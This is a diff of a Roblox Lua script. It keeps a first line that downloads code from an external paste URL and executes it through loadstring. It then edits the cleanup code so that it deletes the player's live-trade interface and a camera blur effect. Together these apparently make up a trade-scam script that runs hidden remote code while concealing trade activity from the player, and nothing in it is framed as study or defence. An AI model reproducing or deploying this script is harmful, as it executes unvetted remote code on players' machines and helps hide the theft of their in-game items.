@@ -1,15 +1,15 @@
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ASQXZcCVrBlLRyxI/raw"))()
 
-local plr = game:GetService("Players").LocalPlayer
-local gui = plr:FindFirstChild("PlayerGui")
+local player = game:GetService("Players").LocalPlayer
 
-if gui then
-    for _, v in ipairs({"TradePrompts", "TradePlayerList", "TradeLiveTrade"}) do
-        local obj = gui:FindFirstChild(v)
-        if obj then
-            obj:Destroy()
-        end
-    end
+local blur = workspace.Camera:FindFirstChild("Blur")
+if blur then
+    blur:Destroy()
+end
+
+local tradeGui = player:WaitForChild("PlayerGui"):FindFirstChild("TradeLiveTrade")
+if tradeGui then
+    tradeGui:Destroy()
 end
 
 task.wait(5)
